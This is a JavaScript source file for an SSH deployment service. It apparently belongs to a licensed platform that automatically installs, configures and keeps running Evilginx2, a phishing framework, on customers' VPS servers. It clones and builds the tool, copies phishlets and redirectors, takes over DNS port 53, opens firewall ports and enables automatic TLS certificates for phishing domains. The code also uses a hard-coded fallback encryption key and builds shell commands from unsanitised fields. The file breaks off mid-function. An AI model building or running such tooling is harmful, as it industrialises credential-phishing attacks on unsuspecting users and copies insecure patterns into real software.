// =====================================================
// SSH Service - Remote VPS Operations
// =====================================================

const { Client } = require('ssh2');
const crypto = require('crypto');

class SSHService {
    constructor(pool) {
        this.pool = pool;
        this.connections = new Map(); // Cache active connections
        this.heartbeatIntervals = new Map(); // Heartbeat timers
        
        // Start connection monitor
        this.startConnectionMonitor();
    }
    
    // Keep connections alive with periodic heartbeat
    startConnectionMonitor() {
        setInterval(() => {
            this.connections.forEach(async (cached, vpsId) => {
                try {
                    if (cached.conn && cached.conn._sock && !cached.conn._sock.destroyed) {
                        // Send a simple command to keep connection alive
                        await this.executeCommand(cached.conn, 'echo "heartbeat"', 5000).catch(() => {
                            // Connection died, remove from cache
                            console.log(`💔 Connection to ${cached.vps?.host} lost, will reconnect on next use`);
                            this.connections.delete(vpsId);
                        });
                    } else {
                        this.connections.delete(vpsId);
                    }
                } catch (e) {
                    this.connections.delete(vpsId);
                }
            });
        }, 30000); // Check every 30 seconds
    }

    // =====================================================
    // ENCRYPTION FOR STORED CREDENTIALS
    // =====================================================

    encryptCredential(text, secretKey) {
        const iv = crypto.randomBytes(16);
        const key = crypto.scryptSync(secretKey || process.env.ENCRYPTION_KEY || 'default-key', 'salt', 32);
        const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        const authTag = cipher.getAuthTag().toString('hex');
        return `${iv.toString('hex')}:${authTag}:${encrypted}`;
    }

    decryptCredential(encryptedText, secretKey) {
        try {
            if (!encryptedText) return null;
            const parts = encryptedText.split(':');
            if (parts.length !== 3) return null;
            
            const iv = Buffer.from(parts[0], 'hex');
            const authTag = Buffer.from(parts[1], 'hex');
            const encrypted = parts[2];
            
            const key = crypto.scryptSync(secretKey || process.env.ENCRYPTION_KEY || 'default-key', 'salt', 32);
            const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
            decipher.setAuthTag(authTag);
            
            let decrypted = decipher.update(encrypted, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            return decrypted;
        } catch (error) {
            console.error('Decryption error:', error);
            return null;
        }
    }

    // =====================================================
    // SSH CONNECTION
    // =====================================================

    async connect(vps) {
        return new Promise((resolve, reject) => {
            const conn = new Client();
            
            const config = {
                host: vps.host,
                port: vps.port || 22,
                username: vps.username,
                readyTimeout: 30000,
                keepaliveInterval: 15000,      // Send keepalive every 15 seconds
                keepaliveCountMax: 10,         // Allow 10 missed keepalives before disconnect
            };

            // Add authentication
            if (vps.auth_type === 'key') {
                config.privateKey = this.decryptCredential(vps.ssh_key_encrypted);
            } else {
                config.password = this.decryptCredential(vps.password_encrypted);
            }

            conn.on('ready', () => {
                console.log(`✅ SSH connected to ${vps.host} (persistent)`);
                resolve(conn);
            });

            conn.on('error', (err) => {
                console.error(`❌ SSH connection error to ${vps.host}:`, err.message);
                this.connections.delete(vps.id);
                reject(err);
            });

            conn.on('close', () => {
                console.log(`🔌 SSH connection to ${vps.host} closed`);
                this.connections.delete(vps.id);
            });
            
            conn.on('end', () => {
                console.log(`📡 SSH connection to ${vps.host} ended`);
                this.connections.delete(vps.id);
            });

            conn.connect(config);
        });
    }

    async getConnection(vpsId) {
        // Check cache first - reuse persistent connection
        if (this.connections.has(vpsId)) {
            const cached = this.connections.get(vpsId);
            if (cached.conn && cached.conn._sock && !cached.conn._sock.destroyed) {
                // Verify connection is still alive with a quick test
                try {
                    await this.executeCommand(cached.conn, 'true', 3000);
                    return cached.conn; // Reuse existing connection
                } catch (e) {
                    console.log(`🔄 Cached connection to ${cached.vps?.host} is stale, reconnecting...`);
                    this.connections.delete(vpsId);
                }
            } else {
                this.connections.delete(vpsId);
            }
        }

        // Get VPS details from database
        const result = await this.pool.query(
            'SELECT * FROM vps_instances WHERE id = ?',
            [vpsId]
        );

        if (result.rows.length === 0) {
            throw new Error('VPS not found');
        }

        const vps = result.rows[0];
        const conn = await this.connect(vps);
        this.connections.set(vpsId, { conn, vps, connectedAt: new Date() });
        return conn;
    }
    
    // Get connection status for all VPS
    getConnectionStatus() {
        const status = {};
        this.connections.forEach((cached, vpsId) => {
            status[vpsId] = {
                connected: cached.conn && cached.conn._sock && !cached.conn._sock.destroyed,
                host: cached.vps?.host,
                connectedAt: cached.connectedAt
            };
        });
        return status;
    }

    // =====================================================
    // COMMAND EXECUTION
    // =====================================================

    async executeCommand(conn, command, timeout = 60000) {
        return new Promise((resolve, reject) => {
            let stdout = '';
            let stderr = '';
            let timer = null;

            if (timeout > 0) {
                timer = setTimeout(() => {
                    reject(new Error(`Command timed out after ${timeout}ms`));
                }, timeout);
            }

            conn.exec(command, (err, stream) => {
                if (err) {
                    if (timer) clearTimeout(timer);
                    return reject(err);
                }

                stream.on('close', (code, signal) => {
                    if (timer) clearTimeout(timer);
                    resolve({
                        code,
                        signal,
                        stdout: stdout.trim(),
                        stderr: stderr.trim()
                    });
                });

                stream.on('data', (data) => {
                    stdout += data.toString();
                });

                stream.stderr.on('data', (data) => {
                    stderr += data.toString();
                });
            });
        });
    }

    async exec(vpsId, command, timeout = 60000) {
        const conn = await this.getConnection(vpsId);
        return this.executeCommand(conn, command, timeout);
    }

    // =====================================================
    // VPS OPERATIONS
    // =====================================================

    async testConnection(vps) {
        try {
            const conn = await this.connect(vps);
            const result = await this.executeCommand(conn, 'echo "Connection successful" && hostname');
            conn.end();
            return { success: true, hostname: result.stdout.split('\n')[1] };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    async getSystemInfo(vpsId) {
        try {
            const conn = await this.getConnection(vpsId);
            
            const commands = {
                os: 'cat /etc/os-release | grep "PRETTY_NAME" | cut -d= -f2 | tr -d \'"\'',
                kernel: 'uname -r',
                cpu_cores: 'nproc',
                memory_total: 'free -m | awk \'/^Mem:/{print $2}\'',
                memory_used: 'free -m | awk \'/^Mem:/{print $3}\'',
                disk_total: 'df -h / | awk \'NR==2{print $2}\'',
                disk_used: 'df -h / | awk \'NR==2{print $3}\'',
                disk_percent: 'df -h / | awk \'NR==2{print $5}\'',
                uptime: 'uptime -s',
                load: 'cat /proc/loadavg | awk \'{print $1, $2, $3}\''
            };

            const info = {};
            for (const [key, cmd] of Object.entries(commands)) {
                try {
                    const result = await this.executeCommand(conn, cmd, 10000);
                    info[key] = result.stdout;
                } catch (e) {
                    info[key] = 'unknown';
                }
            }

            return info;
        } catch (error) {
            throw new Error(`Failed to get system info: ${error.message}`);
        }
    }

    // =====================================================
    // DEPLOYMENT OPERATIONS (Docker-based)
    // =====================================================

    async deploy(vpsId, deploymentId, logCallback) {
        const log = async (level, message) => {
            console.log(`[${level.toUpperCase()}] ${message}`);
            if (logCallback) await logCallback(level, message);
            const logId = crypto.randomBytes(16).toString('hex');
            await this.pool.query(
                'INSERT INTO deployment_logs (id, deployment_id, level, message) VALUES (?, ?, ?, ?)',
                [logId, deploymentId, level, message]
            );
        };

        try {
            // Get VPS details
            const vpsResult = await this.pool.query(
                'SELECT * FROM vps_instances WHERE id = ?',
                [vpsId]
            );
            const vps = vpsResult.rows[0];

            // Update deployment status
            await this.pool.query(
                "UPDATE deployments SET status = ?, started_at = datetime('now') WHERE id = ?",
                ['in_progress', deploymentId]
            );
            await this.pool.query(
                'UPDATE vps_instances SET status = ? WHERE id = ?',
                ['deploying', vpsId]
            );

            await log('info', `🚀 Starting native deployment to ${vps.host}...`);
            const conn = await this.getConnection(vpsId);

            // =====================================================
            // STEP 1: Fix EOL Ubuntu repositories if needed
            // =====================================================
            await log('info', '🔍 Checking system compatibility...');
            
            // Detect OS and fix EOL Ubuntu versions
            let result = await this.executeCommand(conn, `
                # Get OS info
                if [ -f /etc/os-release ]; then
                    . /etc/os-release
                    echo "OS: $ID $VERSION_ID ($VERSION_CODENAME)"
                fi
            `);
            await log('info', `System: ${result.stdout.trim()}`);
            
            // Check if this is an EOL Ubuntu version and fix repositories
            const fixEolUbuntu = `
                # Check if Ubuntu and if repos are working
                if [ -f /etc/os-release ]; then
                    . /etc/os-release
                    if [ "$ID" = "ubuntu" ]; then
                        # Test if apt-get update works
                        if ! sudo apt-get update -qq 2>&1 | grep -q "^E:"; then
                            echo "Repositories OK"
                        else
                            echo "Fixing EOL Ubuntu repositories..."
                            # Backup original sources
                            sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup 2>/dev/null || true
                            
                            # Replace with old-releases for EOL versions
                            sudo sed -i 's|http://archive.ubuntu.com|http://old-releases.ubuntu.com|g' /etc/apt/sources.list
                            sudo sed -i 's|http://security.ubuntu.com|http://old-releases.ubuntu.com|g' /etc/apt/sources.list
                            sudo sed -i 's|http://.*\\.archive.ubuntu.com|http://old-releases.ubuntu.com|g' /etc/apt/sources.list
                            
                            # Remove any docker repo that might cause issues
                            sudo rm -f /etc/apt/sources.list.d/docker.list 2>/dev/null || true
                            
                            # Update package lists
                            sudo apt-get update -qq 2>/dev/null || true
                            echo "Repositories fixed for EOL Ubuntu"
                        fi
                    fi
                fi
            `;
            result = await this.executeCommand(conn, fixEolUbuntu, 120000);
            if (result.stdout.includes('Fixing') || result.stdout.includes('fixed')) {
                await log('info', '🔧 Fixed EOL Ubuntu repositories');
            }

            // =====================================================
            // STEP 2: Check system info (no Docker needed for native build)
            // =====================================================
            await log('info', '🖥️ Checking system info...');
            result = await this.executeCommand(conn, 'uname -a');
            await log('info', `System: ${result.stdout.trim().substring(0, 80)}...`);

            // =====================================================
            // STEP 2: Get repository configuration from admin settings
            // =====================================================
            let repoUrl = null;
            let branch = 'main';
            let dockerImage = null;
            
            await log('info', '⚙️ Fetching deployment configuration...');
            try {
                const settingsResult = await this.pool.query('SELECT repo_url, branch, docker_image FROM github_webhook_settings LIMIT 1');
                if (settingsResult.rows.length > 0) {
                    repoUrl = settingsResult.rows[0].repo_url;
                    branch = settingsResult.rows[0].branch || 'main';
                    dockerImage = settingsResult.rows[0].docker_image;
                }
            } catch (e) {
                await log('warning', 'Could not fetch admin settings');
            }

            // =====================================================
            // STEP 3: Create installation directories
            // =====================================================
            const installPath = vps.install_path || '/opt/evilginx';
            await log('info', `📁 Setting up directories: ${installPath}`);
            await this.executeCommand(conn, `
                sudo mkdir -p ${installPath}/data ${installPath}/phishlets ${installPath}/redirectors ${installPath}/certs &&
                sudo chmod -R 755 ${installPath}
            `);

            // =====================================================
            // STEP 4: Get user info and create license config + Admin API key
            // =====================================================
            await log('info', '🔑 Creating license configuration...');
            const userResult = await this.pool.query(
                'SELECT id, api_key, email, username FROM users WHERE id = ?',
                [vps.user_id]
            );
            const user = userResult.rows[0];
            
            // Generate a unique admin API key for this VPS and store in database
            const adminApiKey = crypto.randomBytes(32).toString('hex');
            await this.pool.query(
                'UPDATE vps_instances SET admin_api_key = ? WHERE id = ?',
                [adminApiKey, vpsId]
            );
            await log('info', '🔐 Admin API key generated and stored securely');
            
            // Use the server's public URL for Management Platform API calls
            const managementUrl = process.env.PUBLIC_URL || `http://${require('os').hostname()}:3000`;
            
            const licenseContent = `# Evilginx2 License Configuration
# Generated by Management Platform - DO NOT MODIFY
user_id: ${user.id}
license_key: ${user.api_key || crypto.randomBytes(32).toString('hex')}
instance_id: ${vps.id}
management_platform_url: ${managementUrl}
version: 3.0.0
`;
            
            await this.executeCommand(conn, `cat > ${installPath}/data/license.conf << 'EOFLIC'
${licenseContent}
EOFLIC`);
            
            // Write the admin API key to the VPS (for Evilginx to use)
            await this.executeCommand(conn, `echo "${adminApiKey}" | sudo tee ${installPath}/api_key.txt > /dev/null`);
            await log('info', `✅ License configured for: ${user.email}`);

            // =====================================================
            // STEP 5: Clone repository and build directly (no Docker)
            // =====================================================
            let version = 'latest';
            
            if (!repoUrl) {
                throw new Error('No repository URL configured. Admin must configure deployment settings.');
            }

            await log('info', '🔨 Building from source (native)...');
            
            // Install Go 1.25.0 (latest stable)
            await log('info', '📦 Checking Go installation...');
            result = await this.executeCommand(conn, '/usr/local/go/bin/go version 2>/dev/null || echo "GO_NOT_FOUND"');
            
            if (result.stdout.includes('GO_NOT_FOUND') || !result.stdout.includes('go1.2')) {
                await log('info', '📥 Installing Go 1.25.0...');
                result = await this.executeCommand(conn, `
                    cd /tmp &&
                    wget -q https://go.dev/dl/go1.25.0.linux-amd64.tar.gz &&
                    sudo rm -rf /usr/local/go &&
                    sudo tar -C /usr/local -xzf go1.25.0.linux-amd64.tar.gz &&
                    rm -f go1.25.0.linux-amd64.tar.gz &&
                    /usr/local/go/bin/go version
                `, 300000);
                
                if (!result.stdout.includes('go version')) {
                    throw new Error('Failed to install Go');
                }
                await log('info', '✅ Go 1.25.0 installed successfully');
            } else {
                await log('info', `✅ Go already installed: ${result.stdout.trim()}`);
            }
            
            // Install build dependencies
            await log('info', '📦 Installing build dependencies...');
            await this.executeCommand(conn, `
                sudo apt-get update -qq 2>/dev/null || true
                sudo apt-get install -y -qq git build-essential gcc 2>/dev/null || true
            `, 120000);
            
            // Clone repository
            await log('info', '📥 Cloning repository...');
            await this.executeCommand(conn, `sudo rm -rf ${installPath}/src 2>/dev/null || true`);
            
            result = await this.executeCommand(conn, `
                sudo git clone --depth 1 -b ${branch} ${repoUrl} ${installPath}/src 2>&1
            `, 180000);
            
            if (result.code !== 0) {
                await log('warning', 'Shallow clone failed, trying full clone...');
                await this.executeCommand(conn, `sudo rm -rf ${installPath}/src 2>/dev/null || true`);
                result = await this.executeCommand(conn, `
                    sudo git clone -b ${branch} ${repoUrl} ${installPath}/src 2>&1
                `, 300000);
            }
            
            // Find actual source directory
            result = await this.executeCommand(conn, `
                if [ -f ${installPath}/src/main.go ]; then
                    echo "${installPath}/src"
                elif [ -d ${installPath}/src/evilginx2-master ] && [ -f ${installPath}/src/evilginx2-master/main.go ]; then
                    echo "${installPath}/src/evilginx2-master"
                elif [ -d ${installPath}/src/evilginx2 ]; then
                    echo "${installPath}/src/evilginx2"
                else
                    find ${installPath}/src -maxdepth 2 -name "main.go" | head -1 | xargs dirname 2>/dev/null || echo "${installPath}/src"
                fi
            `);
            const srcPath = result.stdout.trim();
            await log('info', `📂 Source directory: ${srcPath}`);
            
            // Show contents
            result = await this.executeCommand(conn, `ls -la ${srcPath}/ 2>&1 | head -10`);
            await log('info', `📂 Contents: ${result.stdout.split('\\n').slice(1, 6).join(', ')}`);
            
            // Get version
            result = await this.executeCommand(conn, `cd ${srcPath} && git rev-parse --short HEAD 2>/dev/null || echo "dev"`);
            version = result.stdout.trim() || 'dev';
            await log('info', `📌 Version: ${version}`);
            
            // Build the binary (using user's proven approach)
            await log('info', '🔨 Building Evilginx binary (this may take a few minutes)...');
            
            // IMPORTANT: Delete old binary first to ensure we detect build failures
            await this.executeCommand(conn, `sudo rm -f ${installPath}/evilginx 2>/dev/null || true`);
            
            result = await this.executeCommand(conn, `
                cd ${srcPath} &&
                
                # Set Go environment with proper cache directories
                export PATH=/usr/local/go/bin:$PATH &&
                export HOME=/root &&
                export GOPATH=/root/go &&
                export GOCACHE=/tmp/go-build-cache &&
                export GOMODCACHE=/tmp/go-mod-cache &&
                
                # Create cache directories with proper permissions
                mkdir -p /tmp/go-build-cache /tmp/go-mod-cache 2>/dev/null || true
                chmod 777 /tmp/go-build-cache /tmp/go-mod-cache 2>/dev/null || true
                
                # Add safe directory for git to prevent "dubious ownership" error
                git config --global --add safe.directory ${srcPath} 2>/dev/null || true
                git config --global --add safe.directory ${installPath}/src 2>/dev/null || true
                
                # Build with verbose output, disable VCS stamping to avoid git issues
                /usr/local/go/bin/go build -v -buildvcs=false -o ${installPath}/evilginx 2>&1
            `, 600000);
            
            await log('info', `📋 Build output:\n${result.stdout || '(no output)'}`);
            
            // Check if build actually failed (look for error messages)
            if (result.stdout && (result.stdout.includes('permission denied') || result.stdout.includes('cannot find') || result.stdout.includes('undefined:'))) {
                throw new Error(`Build failed with errors. Check build output above.`);
            }
            
            // Check if binary was created (must exist since we deleted the old one)
            result = await this.executeCommand(conn, `ls -la ${installPath}/evilginx 2>&1`);
            if (result.code !== 0 || result.stdout.includes('No such file')) {
                throw new Error(`Build failed - binary not created. Check build output above.`);
            }
            await log('info', '✅ Binary built successfully');
            
            // Copy phishlets, redirectors, and admin dashboard
            await log('info', '📁 Copying phishlets, admin dashboard, and configuration...');
            await this.executeCommand(conn, `
                sudo cp -r ${srcPath}/phishlets/* ${installPath}/phishlets/ 2>/dev/null || true
                sudo cp -r ${srcPath}/redirectors/* ${installPath}/redirectors/ 2>/dev/null || true
                
                # Copy admin dashboard (required for web UI)
                sudo mkdir -p ${installPath}/admin
                sudo cp -r ${srcPath}/admin/* ${installPath}/admin/ 2>/dev/null || true
                
                sudo chmod +x ${installPath}/evilginx
                echo "Admin dashboard copied to ${installPath}/admin"
            `);
            
            // =====================================================
            // STEP 6: Stop systemd-resolved to free port 53
            // =====================================================
            await log('info', '🔧 Preparing network (freeing port 53)...');
            await this.executeCommand(conn, `
                # Stop and permanently disable systemd-resolved to free port 53
                sudo systemctl stop systemd-resolved 2>/dev/null || true
                sudo systemctl disable systemd-resolved 2>/dev/null || true
                sudo systemctl mask systemd-resolved 2>/dev/null || true
                
                # Kill any remaining process on port 53
                sudo fuser -k 53/udp 2>/dev/null || true
                sudo fuser -k 53/tcp 2>/dev/null || true
                
                # Update resolv.conf to use external DNS
                sudo rm -f /etc/resolv.conf
                echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf
                echo "nameserver 8.8.4.4" | sudo tee -a /etc/resolv.conf
                
                # Prevent resolv.conf from being modified
                sudo chattr +i /etc/resolv.conf 2>/dev/null || true
                
                echo "Network prepared - port 53 freed"
            `);
            
            // =====================================================
            // STEP 7: Stop existing service
            // =====================================================
            await log('info', '🛑 Stopping existing service...');
            await this.executeCommand(conn, 'sudo systemctl stop evilginx 2>/dev/null || true');
            await this.executeCommand(conn, 'sudo pkill -f evilginx 2>/dev/null || true');
            
            // =====================================================
            // STEP 8: Install tmux and create systemd service
            // =====================================================
            await log('info', '📦 Installing tmux...');
            await this.executeCommand(conn, 'sudo apt-get install -y tmux 2>/dev/null || true');
            
            await log('info', '📝 Creating systemd service (using tmux)...');
            const serviceFile = `[Unit]
Description=Evilginx2 Phishing Framework
After=network.target

[Service]
Type=forking
WorkingDirectory=${installPath}
ExecStart=/usr/bin/tmux new-session -d -s evilginx '${installPath}/evilginx -p ${installPath}/phishlets -c ${installPath}/data -admin 5555 -admin-bind 0.0.0.0'
ExecStop=/usr/bin/tmux kill-session -t evilginx
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
`;
            await this.executeCommand(conn, `sudo tee /etc/systemd/system/evilginx.service > /dev/null << 'EOFSVC'
${serviceFile}
EOFSVC`);
            
            // Reload systemd and start service
            await this.executeCommand(conn, 'sudo systemctl daemon-reload');
            result = await this.executeCommand(conn, 'sudo systemctl start evilginx');
            
            if (result.code !== 0) {
                // Get more info on why it failed
                const status = await this.executeCommand(conn, 'sudo systemctl status evilginx 2>&1 | head -20');
                await log('error', `Service start failed:\n${status.stdout}`);
                throw new Error(`Failed to start service: ${result.stderr || status.stdout}`);
            }
            
            await this.executeCommand(conn, 'sudo systemctl enable evilginx 2>/dev/null || true');
            await log('info', '✅ Service started');

            // =====================================================
            // STEP 9: Configure firewall to allow access
            // =====================================================
            await log('info', '🔥 Configuring firewall...');
            await this.executeCommand(conn, `
                # Open required ports in UFW if installed
                if command -v ufw &> /dev/null; then
                    sudo ufw allow 80/tcp 2>/dev/null || true
                    sudo ufw allow 443/tcp 2>/dev/null || true
                    sudo ufw allow 53/udp 2>/dev/null || true
                    sudo ufw allow 5555/tcp 2>/dev/null || true
                    echo "UFW rules added"
                fi
                
                # Also add iptables rules as fallback
                sudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT 2>/dev/null || true
                sudo iptables -I INPUT -p tcp --dport 443 -j ACCEPT 2>/dev/null || true
                sudo iptables -I INPUT -p udp --dport 53 -j ACCEPT 2>/dev/null || true
                sudo iptables -I INPUT -p tcp --dport 5555 -j ACCEPT 2>/dev/null || true
                echo "Firewall configured"
            `);
            await log('info', '✅ Firewall configured for ports 80, 443, 53, 5555');

            // =====================================================
            // STEP 10: Verify service is running
            // =====================================================
            await log('info', '🔍 Verifying deployment...');
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            result = await this.executeCommand(conn, 'sudo systemctl is-active evilginx');
            const isRunning = result.stdout.trim() === 'active';

            if (isRunning) {
                await log('info', '✅ Service is running!');
                
                // Get service logs
                result = await this.executeCommand(conn, 'sudo journalctl -u evilginx --no-pager -n 15 2>&1');
                await log('info', `📋 Service logs:\n${result.stdout}`);
                
                // Check if admin API is accessible
                await log('info', '🔗 Testing admin API on port 5555...');
                result = await this.executeCommand(conn, 'curl -s -o /dev/null -w "%{http_code}" http://localhost:5555/ 2>/dev/null || echo "000"');
                if (result.stdout.trim() !== '000') {
                    await log('info', `✅ Admin API responding (HTTP ${result.stdout.trim()})`);
                    
                    // =====================================================
                    // STEP 10b: Configure autocert and external IP for SSL
                    // =====================================================
                    await log('info', '🔒 Configuring auto SSL (Let\'s Encrypt)...');
                    
                    // Get external IP of the VPS
                    const externalIpResult = await this.executeCommand(conn, 'curl -s ifconfig.me || curl -s icanhazip.com || echo ""');
                    const externalIP = externalIpResult.stdout.trim();
                    
                    if (externalIP) {
                        // Read API key for authentication
                        const keyResult = await this.executeCommand(conn, `cat ${installPath}/api_key.txt 2>/dev/null || echo ""`);
                        const apiKey = keyResult.stdout.trim();
                        
                        if (apiKey) {
                            // First login to get a session
                            await this.executeCommand(conn, `
                                curl -s -X POST http://localhost:5555/api/login \
                                    -H "Content-Type: application/json" \
                                    -c /tmp/evilginx_cookies.txt \
                                    -d '{"api_key":"${apiKey}"}'
                            `);
                            
                            // Enable autocert via API
                            const autocertResult = await this.executeCommand(conn, `
                                curl -s -X POST http://localhost:5555/api/config \
                                    -H "Content-Type: application/json" \
                                    -b /tmp/evilginx_cookies.txt \
                                    -d '{"field":"autocert","value":"true"}'
                            `);
                            await log('info', '✅ Auto SSL (autocert) enabled');
                            
                            // Set external IP via API
                            const ipResult = await this.executeCommand(conn, `
                                curl -s -X POST http://localhost:5555/api/config \
                                    -H "Content-Type: application/json" \
                                    -b /tmp/evilginx_cookies.txt \
                                    -d '{"field":"external_ipv4","value":"${externalIP}"}'
                            `);
                            await log('info', `✅ External IP set to: ${externalIP}`);
                            
                            // Cleanup cookies
                            await this.executeCommand(conn, 'rm -f /tmp/evilginx_cookies.txt');
                        }
                    } else {
                        await log('warning', '⚠️ Could not detect external IP - SSL may need manual configuration');
                    }
                } else {
                    await log('warning', '⚠️ Admin API not responding yet - may need a moment to start');
                }
            } else {
                await log('warning', '⚠️ Service may not be running properly');
                result = await this.executeCommand(conn, 'sudo journalctl -u evilginx --no-pager -n 30 2>&1');
                await log('warning', `Service logs:\n${result.stdout}`);
            }

            // =====================================================
            // STEP 11: Update database
            // =====================================================
            await this.pool.query(`
                UPDATE vps_instances SET 
                    status = ?, 
                    is_deployed = 1, 
                    deployed_version = ?,
                    updated_at = datetime('now')
                WHERE id = ?
            `, [isRunning ? 'running' : 'error', version, vpsId]);

            await this.pool.query(`
                UPDATE deployments SET 
                    status = ?, 
                    completed_at = datetime('now'),
                    to_version = ?
                WHERE id = ?
            `, ['completed', version, deploymentId]);

            // =====================================================
            // STEP 11: Sync API key from VPS to database
            // =====================================================
            await log('info', '🔑 Syncing admin API key...');
            try {
                // Wait a moment for Evilginx to fully start and generate its key
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Read the actual API key from the VPS
                const keyResult = await this.executeCommand(conn, `cat ${installPath}/api_key.txt 2>/dev/null || echo ""`);
                const actualKey = keyResult.stdout.trim();
                
                if (actualKey && actualKey.length >= 32) {
                    // Update database with the actual key
                    await this.pool.query(
                        'UPDATE vps_instances SET admin_api_key = ? WHERE id = ?',
                        [actualKey, vpsId]
                    );
                    await log('info', '✅ API key synced to database');
                }
            } catch (keyError) {
                await log('warning', '⚠️ Could not sync API key: ' + keyError.message);
            }

            await log('info', '🎉 Deployment completed successfully!');
            return { success: true, version };

        } catch (error) {
            await log('error', `❌ Deployment failed: ${error.message}`);
            
            await this.pool.query(
                "UPDATE deployments SET status = ?, completed_at = datetime('now'), error_message = ? WHERE id = ?",
                ['failed', error.message, deploymentId]
            );
            await this.pool.query(
                'UPDATE vps_instances SET status = ?, last_error = ? WHERE id = ?',
                ['error', error.message, vpsId]
            );

            throw error;
        }
    }

    async startService(vpsId) {
        const conn = await this.getConnection(vpsId);
        
        // Start systemd service
        let result = await this.executeCommand(conn, 'sudo systemctl start evilginx 2>&1');
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        const status = await this.executeCommand(conn, 'sudo systemctl is-active evilginx');
        const isRunning = status.stdout.trim() === 'active';
        
        await this.pool.query(
            'UPDATE vps_instances SET status = ? WHERE id = ?',
            [isRunning ? 'running' : 'error', vpsId]
        );
        
        return { success: isRunning, status: isRunning ? 'running' : 'failed' };
    }

    async stopService(vpsId) {
        const conn = await this.getConnection(vpsId);
        await this.executeCommand(conn, 'sudo systemctl stop evilginx 2>/dev/null || true');
        
        await this.pool.query(
            'UPDATE vps_instances SET status = ? WHERE id = ?',
            ['stopped', vpsId]
        );
        
        return { success: true };
    }

    async restartService(vpsId) {
        const conn = await this.getConnection(vpsId);
        await this.executeCommand(conn, 'sudo systemctl restart evilginx 2>&1');
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        const status = await this.executeCommand(conn, 'sudo systemctl is-active evilginx');
        const isRunning = status.stdout.trim() === 'active';
        
        await this.pool.query(
            'UPDATE vps_instances SET status = ? WHERE id = ?',
            [isRunning ? 'running' : 'error', vpsId]
        );
        
        return { success: isRunning, status: isRunning ? 'running' : 'failed' };
    }

    async getServiceStatus(vpsId) {
        try {
            const conn = await this.getConnection(vpsId);
            
            // VPS is online if we can connect via SSH
            // Check if tmux session is running (more reliable than systemd for forking services)
            const tmuxCheck = await this.executeCommand(conn, 
                'tmux has-session -t evilginx 2>/dev/null && echo "running" || echo "stopped"'
            );
            const tmuxRunning = tmuxCheck.stdout.trim() === 'running';
            
            // Also check systemd service status
            const statusResult = await this.executeCommand(conn, 
                'sudo systemctl is-active evilginx 2>/dev/null || echo "inactive"'
            );
            
            const serviceStatus = statusResult.stdout.trim();
            const isActive = serviceStatus === 'active';
            
            // Check if service file exists (has been deployed)
            const serviceExists = await this.executeCommand(conn,
                'test -f /etc/systemd/system/evilginx.service && echo "yes" || echo "no"'
            );
            const hasService = serviceExists.stdout.trim() === 'yes';
            
            // Calculate uptime from systemd
            let uptimeSeconds = 0;
            if (isActive) {
                const uptimeResult = await this.executeCommand(conn,
                    'systemctl show evilginx --property=ActiveEnterTimestamp 2>/dev/null | cut -d= -f2'
                );
                const startTime = uptimeResult.stdout.trim();
                if (startTime) {
                    const startDate = new Date(startTime);
                    uptimeSeconds = Math.floor((Date.now() - startDate.getTime()) / 1000);
                }
            }

            // Get PID if running
            const pidResult = await this.executeCommand(conn, 
                'systemctl show evilginx --property=MainPID 2>/dev/null | cut -d= -f2'
            );
            const pid = pidResult.stdout.trim();

            // Determine status:
            // - 'running' = tmux session is active (evilginx is running)
            // - 'stopped' = service exists but is stopped
            // - 'connected' = VPS is reachable but no service
            // - 'offline' = VPS is not reachable (this won't happen here since we connected)
            let newStatus;
            if (tmuxRunning || isActive) {
                newStatus = 'running';
            } else if (hasService) {
                newStatus = 'stopped';
            } else {
                newStatus = 'connected'; // VPS online, but no container deployed
            }
            
            // Update status, heartbeat, and uptime
            await this.pool.query(
                "UPDATE vps_instances SET status = ?, last_heartbeat = datetime('now'), uptime_seconds = ?, updated_at = datetime('now'), last_error = NULL WHERE id = ?",
                [newStatus, uptimeSeconds, vpsId]
            );

            // Auto-sync API key if service is running
            if (tmuxRunning || isActive) {
                try {
                    // Get VPS install path
                    const vpsResult = await this.pool.query('SELECT install_path FROM vps_instances WHERE id = ?', [vpsId]);
                    const installPath = vpsResult.rows[0]?.install_path || '/opt/evilginx';
                    
                    // Read actual API key from VPS
                    const keyResult = await this.executeCommand(conn, `cat ${installPath}/api_key.txt 2>/dev/null || echo ""`);
                    const actualKey = keyResult.stdout.trim();
                    
                    if (actualKey && actualKey.length >= 32) {
                        // Update database with actual key (silently)
                        await this.pool.query(
                            'UPDATE vps_instances SET admin_api_key = ? WHERE id = ?',
                            [actualKey, vpsId]
                        );
                    }
                } catch (keyError) {
                    // Silently ignore key sync errors during status check
                }
            }

            return {
                running: tmuxRunning || isActive,
                status: newStatus,
                service_status: tmuxRunning ? 'running (tmux)' : (serviceStatus || 'not deployed'),
                pid: pid || null,
                uptime_seconds: uptimeSeconds,
                connected: true
            };
        } catch (error) {
            // VPS is offline - couldn't connect
            await this.pool.query(
                "UPDATE vps_instances SET status = 'offline', last_error = ?, updated_at = datetime('now') WHERE id = ?",
                [error.message, vpsId]
            );
            return { running: false, status: 'offline', connected: false, error: error.message };
        }
    }

    async getLogs(vpsId, lines = 100) {
        const conn = await this.getConnection(vpsId);
        
        // Get logs from systemd journal and tmux
        const result = await this.executeCommand(conn, `
            echo "=== TMUX SESSION STATUS ===" &&
            (tmux has-session -t evilginx 2>/dev/null && echo "Evilginx tmux session: RUNNING" || echo "Evilginx tmux session: NOT RUNNING") &&
            echo "" &&
            echo "=== EVILGINX SERVICE LOGS ===" &&
            sudo journalctl -u evilginx --no-pager -n ${lines} 2>&1 || echo "Service logs not found"
        `);

        return result.stdout;
    }

    // Get the admin API key from the VPS
    async getAdminAPIKey(vpsId, installPath) {
        const conn = await this.getConnection(vpsId);
        
        // Try to read api_key.txt from the install path
        const result = await this.executeCommand(conn, `
            cat ${installPath}/api_key.txt 2>/dev/null || cat ${installPath}/data/api_key.txt 2>/dev/null || echo ""
        `);
        
